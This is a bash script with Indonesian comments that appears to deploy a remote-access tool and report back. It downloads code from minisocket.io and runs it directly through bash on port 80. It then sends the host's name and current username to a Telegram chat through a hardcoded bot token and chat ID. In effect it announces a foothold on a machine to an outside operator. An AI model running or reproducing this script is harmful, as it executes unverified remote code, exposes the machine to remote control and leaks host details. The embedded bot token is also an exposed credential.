#!/bin/bash

# Telegram Config
TG_BOT_TOKEN="8628717278:AAEcQd6vINfT95yNRv8tRD_u-51pFwDamqs"
TG_CHAT_ID="1142721678"

send_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TG_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="HTML" >/dev/null 2>&1
}

# Jalankan command
MINI_PORT=80 bash -c "$(curl -fsSL https://minisocket.io/bin/x)"

# Simpan output ke file
if [ $? -eq 0 ]; then
    OUTPUT="Success ==> MINI_PORT=80 MiniSocket Running"
    echo "$OUTPUT" | tee output.txt
    send_telegram "🟢 <b>MiniSocket Success</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
🔌 <b>Port:</b> <code>22</code>
✅ Status: Running
━━━━━━━━━━━━━━━"
else
    OUTPUT="Failed :("
    echo "$OUTPUT" | tee output.txt
    send_telegram "🔴 <b>MiniSocket Failed</b>
━━━━━━━━━━━━━━━
🖥 <b>Host:</b> <code>$(hostname 2>/dev/null || echo unknown)@$(whoami 2>/dev/null || echo unknown)</code>
❌ Status: Failed
━━━━━━━━━━━━━━━"
fi
